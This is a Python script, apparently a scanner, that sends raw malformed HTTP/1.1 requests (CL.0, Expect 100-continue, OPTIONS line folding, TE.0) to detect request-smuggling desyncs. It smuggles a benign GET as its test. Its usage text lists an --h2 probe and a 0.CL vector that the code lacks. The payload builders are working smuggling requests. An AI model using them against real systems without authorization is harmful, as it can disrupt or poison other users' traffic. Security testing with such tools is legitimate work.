#!/usr/bin/env python3
"""
desync_probe.py - HTTP/1.1 desync / request-smuggling probe (2024-2026 vectors).

Implements the modern parser-discrepancy probes popularised by James Kettle's
"HTTP/1.1 Must Die: The Desync Endgame" (Black Hat/DEF CON 2025) plus the 2024
TE.0 work by sw33tLie/bsysop/Medusa:
  - CL.0       backend ignores Content-Length on certain paths
  - 0.CL       front-end emits an early response (e.g. on Expect) and backend
               reads the body as a new request (CVE-2025-32094 class)
  - Expect     "Expect: 100-continue" early-response desync
  - TE.0       backend dechunks but front-end treats body as CL=0
  - line-fold  obsolete header line folding (RFC 7230 obs-fold) discrepancy

This is a *detection* tool. It uses the timing/visible-difference method:
a benign probe is compared against a malformed probe; a desync is flagged when
the malformed variant produces a measurable behavioural delta (status change,
timeout, or reflected smuggled path). It deliberately smuggles only a GET to a
404/control path so it does not poison other users' requests.

Dependency: pip install h2 (only needed for --h2 downgrade probe; optional)
Stdlib-only for the HTTP/1.1 probes.

Usage:
  python3 desync_probe.py https://target.tld --path /              # all probes
  python3 desync_probe.py https://target.tld --probe expect,cl0
  python3 desync_probe.py https://target.tld --smuggle-path /robots.txt --verbose

LEGAL: authorized testing only. Smuggling can affect co-tenant traffic on shared
infrastructure (CDNs); run against scoped targets and avoid POST smuggling on prod.
"""
import argparse
import socket
import ssl
import sys
import time
from urllib.parse import urlparse

DEFAULT_TIMEOUT = 10.0


def _connect(host, port, use_tls, timeout, insecure=False):
    raw = socket.create_connection((host, port), timeout=timeout)
    if use_tls:
        ctx = ssl.create_default_context()
        if insecure:
            # Only when explicitly opted in (--insecure) for scoped self-signed targets.
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
        # ALPN http/1.1 to force the legacy desync surface (vs HTTP/2)
        ctx.set_alpn_protocols(["http/1.1"])
        return ctx.wrap_socket(raw, server_hostname=host)
    return raw


def _send_raw(host, port, use_tls, payload, timeout, read_bytes=8192, insecure=False):
    """Send raw bytes, return (elapsed_seconds, response_bytes)."""
    s = _connect(host, port, use_tls, timeout, insecure=insecure)
    start = time.time()
    try:
        s.sendall(payload)
        chunks = b""
        s.settimeout(timeout)
        try:
            while len(chunks) < read_bytes:
                data = s.recv(4096)
                if not data:
                    break
                chunks += data
        except socket.timeout:
            pass
        return time.time() - start, chunks
    finally:
        try:
            s.close()
        except Exception:
            pass


def _status_line(resp):
    try:
        return resp.split(b"\r\n", 1)[0].decode("latin-1")
    except Exception:
        return "<no response>"


def build_baseline(host, path):
    return (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode()


def build_cl0(host, path, smuggle_path):
    # Content-Length present, body is a full smuggled request. Backend that ignores
    # CL on this endpoint will parse the smuggled GET as a separate request.
    smuggled = f"GET {smuggle_path} HTTP/1.1\r\nHost: {host}\r\nFoo: bar"
    body = smuggled
    return (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: keep-alive\r\n"
        f"\r\n"
        f"{body}"
    ).encode()


def build_expect(host, path, smuggle_path):
    # Expect: 100-continue early-response desync (CVE-2025-32094 family).
    smuggled = f"GET {smuggle_path} HTTP/1.1\r\nHost: {host}\r\nX-Ignore: x"
    body = smuggled
    return (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Expect: 100-continue\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: keep-alive\r\n"
        f"\r\n"
        f"{body}"
    ).encode()


def build_options_linefold(host, path, smuggle_path):
    # OPTIONS + Expect + obsolete line folding (Akamai Ghost CVE-2025-32094).
    # The folded header continuation line begins with a space/tab.
    smuggled = f"GET {smuggle_path} HTTP/1.1\r\nHost: {host}\r\nX-Ignore: x"
    body = smuggled
    return (
        f"OPTIONS {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Expect: 100-continue\r\n"
        f"X-Folded: first\r\n"
        f"\tsecond\r\n"  # obsolete line folding (obs-fold)
        f"Content-Length: {len(body)}\r\n"
        f"Connection: keep-alive\r\n"
        f"\r\n"
        f"{body}"
    ).encode()


def build_te0(host, path, smuggle_path):
    # TE.0: backend honours Transfer-Encoding (dechunks, terminator 0),
    # front-end treats it as CL=0 and forwards the trailing bytes as a new request.
    smuggled = f"GET {smuggle_path} HTTP/1.1\r\nHost: {host}\r\nX-Ignore: x\r\n\r\n"
    return (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Connection: keep-alive\r\n"
        f"\r\n"
        f"0\r\n"
        f"\r\n"
        f"{smuggled}"
    ).encode()


PROBES = {
    "cl0": build_cl0,
    "expect": build_expect,
    "options": build_options_linefold,
    "te0": build_te0,
}


def run_probe(name, builder, host, port, use_tls, path, smuggle_path, timeout, verbose, insecure):
    base_t, base_resp = _send_raw(host, port, use_tls, build_baseline(host, path), timeout,
                                  insecure=insecure)
    base_status = _status_line(base_resp)

    payload = builder(host, path, smuggle_path)
    try:
        probe_t, probe_resp = _send_raw(host, port, use_tls, payload, timeout, insecure=insecure)
    except (socket.timeout, OSError) as e:
        print(f"[{name}] connection error: {e}")
        return

    probe_status = _status_line(probe_resp)
    timed_out = probe_t >= (timeout - 0.5)
    delta = probe_t - base_t

    flags = []
    if timed_out:
        flags.append("TIMEOUT(socket starved -> likely desync)")
    if smuggle_path.encode() in probe_resp and smuggle_path.encode() not in base_resp:
        flags.append("SMUGGLED-PATH-REFLECTED")
    if base_status != probe_status:
        flags.append(f"STATUS-DELTA({base_status} -> {probe_status})")
    if delta > 5.0 and not timed_out:
        flags.append(f"TIMING-DELTA(+{delta:.1f}s)")

    verdict = "POTENTIAL DESYNC" if flags else "no signal"
    print(f"[{name:8}] base={base_status!r} probe={probe_status!r} "
          f"dt={delta:+.2f}s -> {verdict}")
    if flags:
        for f in flags:
            print(f"            -> {f}")
    if verbose:
        print(f"            payload bytes: {len(payload)}; resp head: {probe_resp[:120]!r}")


def main():
    ap = argparse.ArgumentParser(description="HTTP/1.1 desync probe (2024-2026 vectors)")
    ap.add_argument("url")
    ap.add_argument("--path", default="/", help="endpoint to test (default /)")
    ap.add_argument("--smuggle-path", default="/robots.txt",
                    help="benign path to smuggle for reflection detection")
    ap.add_argument("--probe", default="all",
                    help="comma list: cl0,expect,options,te0 or 'all'")
    ap.add_argument("--timeout", type=float, default=DEFAULT_TIMEOUT)
    ap.add_argument("--verbose", action="store_true")
    ap.add_argument("--insecure", action="store_true",
                    help="disable TLS verification (scoped self-signed targets only)")
    args = ap.parse_args()

    u = urlparse(args.url)
    use_tls = u.scheme == "https"
    host = u.hostname
    port = u.port or (443 if use_tls else 80)
    if not host:
        print("invalid url"); sys.exit(1)

    selected = list(PROBES) if args.probe == "all" else [p.strip() for p in args.probe.split(",")]
    print(f"[*] target {host}:{port} tls={use_tls} path={args.path} probes={selected}\n")
    for name in selected:
        if name not in PROBES:
            print(f"[!] unknown probe {name}"); continue
        run_probe(name, PROBES[name], host, port, use_tls,
                  args.path, args.smuggle_path, args.timeout, args.verbose, args.insecure)


if __name__ == "__main__":
    main()
